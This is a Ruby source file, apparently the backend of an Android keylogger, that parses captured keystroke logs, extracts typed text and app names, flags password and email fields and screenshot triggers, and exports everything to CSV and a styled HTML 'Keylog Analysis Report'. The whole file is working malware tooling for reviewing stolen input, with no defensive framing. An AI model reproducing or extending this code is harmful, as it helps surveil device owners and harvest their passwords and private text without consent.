# frozen_string_literal: true

# KeylogProcessor - Processes JSON-structured keylogs from Android client
# Parses keylog buffer, extracts metadata, detects sensitive fields
class KeylogProcessor
  attr_reader :keylogs, :sensitive_entries, :session_stats

  def initialize(keylog_buffer)
    @raw_buffer = keylog_buffer
    @keylogs = []
    @sensitive_entries = []
    @session_stats = Hash.new(0)
    
    parse_buffer
  end

  # Parse JSON keylog buffer
  def parse_buffer
    return if @raw_buffer.blank?

    # Split by newlines (each line is a JSON object)
    lines = @raw_buffer.split("\n").reject(&:blank?)
    
    lines.each do |line|
      begin
        entry = JSON.parse(line)
        process_entry(entry)
      rescue JSON::ParserError => e
        Rails.logger.error("Failed to parse keylog entry: #{e.message}")
        # Fallback: try to extract plain text
        @keylogs << { raw_text: line, parse_error: true }
      end
    end
    
    calculate_stats
  end

  # Process individual keylog entry
  def process_entry(entry)
    keylog = {
      timestamp: Time.at(entry['timestamp'].to_i / 1000.0),
      session_id: entry['session_id'],
      event_type: entry['event_type'],
      app_package: entry['app_package'],
      field_id: entry['field_id'],
      hint: entry['hint'],
      input_type: entry['input_type'],
      keystroke: entry['keystroke'],
      full_text: entry['full_text'],
      is_sensitive: entry['is_sensitive'] || false,
      screenshot_triggered: entry['screenshot_triggered'] || false
    }
    
    @keylogs << keylog
    @sensitive_entries << keylog if keylog[:is_sensitive]
    @session_stats[keylog[:session_id]] += 1
  end

  # Calculate statistics
  def calculate_stats
    @stats = {
      total_keystrokes: @keylogs.count,
      sensitive_fields: @sensitive_entries.count,
      unique_sessions: @session_stats.keys.count,
      unique_apps: @keylogs.map { |k| k[:app_package] }.uniq.count,
      screenshots_triggered: @keylogs.count { |k| k[:screenshot_triggered] },
      password_fields: @keylogs.count { |k| k[:input_type] == 'password' },
      email_fields: @keylogs.count { |k| k[:input_type] == 'email' }
    }
  end

  # Get keylogs by app
  def keylogs_by_app
    @keylogs.group_by { |k| k[:app_package] }
  end

  # Get keylogs by session
  def keylogs_by_session
    @keylogs.group_by { |k| k[:session_id] }
  end

  # Get sensitive keylogs only
  def sensitive_keylogs
    @sensitive_entries
  end

  # Get keylogs in time range
  def keylogs_in_range(start_time, end_time)
    @keylogs.select { |k| k[:timestamp].between?(start_time, end_time) }
  end

  # Export to CSV
  def to_csv
    require 'csv'
    
    CSV.generate(headers: true) do |csv|
      csv << ['Timestamp', 'Session ID', 'App', 'Field', 'Hint', 'Input Type', 'Text', 'Sensitive']
      
      @keylogs.each do |entry|
        csv << [
          entry[:timestamp].strftime('%Y-%m-%d %H:%M:%S'),
          entry[:session_id],
          entry[:app_package],
          entry[:field_id],
          entry[:hint],
          entry[:input_type],
          entry[:full_text],
          entry[:is_sensitive] ? 'YES' : 'NO'
        ]
      end
    end
  end

  # Export to HTML report
  def to_html_report
    html = <<-HTML
      <!DOCTYPE html>
      <html>
      <head>
        <title>Keylog Analysis Report</title>
        <style>
          body { font-family: 'Segoe UI', sans-serif; background: #1e1e2f; color: #c9d1d9; padding: 20px; }
          .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 30px; border-radius: 12px; margin-bottom: 30px; }
          .stat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
          .stat-card { background: #27293d; padding: 20px; border-radius: 10px; border-left: 4px solid #667eea; }
          .stat-value { font-size: 36px; font-weight: bold; color: #667eea; }
          .stat-label { font-size: 14px; text-transform: uppercase; opacity: 0.8; }
          table { width: 100%; border-collapse: collapse; background: #27293d; border-radius: 10px; overflow: hidden; }
          th { background: #667eea; padding: 15px; text-align: left; color: white; }
          td { padding: 12px 15px; border-bottom: 1px solid rgba(255,255,255,0.05); }
          tr:hover { background: rgba(102, 126, 234, 0.1); }
          .sensitive { color: #f85149; font-weight: bold; }
          .password { background: rgba(248, 81, 73, 0.1); }
        </style>
      </head>
      <body>
        <div class="header">
          <h1>⌨️ Keylog Analysis Report</h1>
          <p>Generated: #{Time.now.strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="stat-grid">
          <div class="stat-card">
            <div class="stat-value">#{@stats[:total_keystrokes]}</div>
            <div class="stat-label">Total Keystrokes</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">#{@stats[:sensitive_fields]}</div>
            <div class="stat-label">Sensitive Fields</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">#{@stats[:unique_sessions]}</div>
            <div class="stat-label">Sessions</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">#{@stats[:unique_apps]}</div>
            <div class="stat-label">Apps</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">#{@stats[:screenshots_triggered]}</div>
            <div class="stat-label">Screenshots</div>
          </div>
          <div class="stat-card">
            <div class="stat-value">#{@stats[:password_fields]}</div>
            <div class="stat-label">Password Fields</div>
          </div>
        </div>
        
        <h2>Keylog Entries</h2>
        <table>
          <thead>
            <tr>
              <th>Time</th>
              <th>App</th>
              <th>Field</th>
              <th>Input Type</th>
              <th>Text</th>
            </tr>
          </thead>
          <tbody>
    HTML
    
    @keylogs.each do |entry|
      row_class = entry[:input_type] == 'password' ? 'password' : ''
      text_class = entry[:is_sensitive] ? 'sensitive' : ''
      
      html += <<-HTML
        <tr class="#{row_class}">
          <td>#{entry[:timestamp].strftime('%H:%M:%S')}</td>
          <td>#{entry[:app_package]}</td>
          <td>#{entry[:field_id]}</td>
          <td>#{entry[:input_type]}</td>
          <td class="#{text_class}">#{entry[:full_text]}</td>
        </tr>
      HTML
    end
    
    html += <<-HTML
          </tbody>
        </table>
      </body>
      </html>
    HTML
    
    html
  end

  # Statistics summary
  def stats
    @stats
  end
end
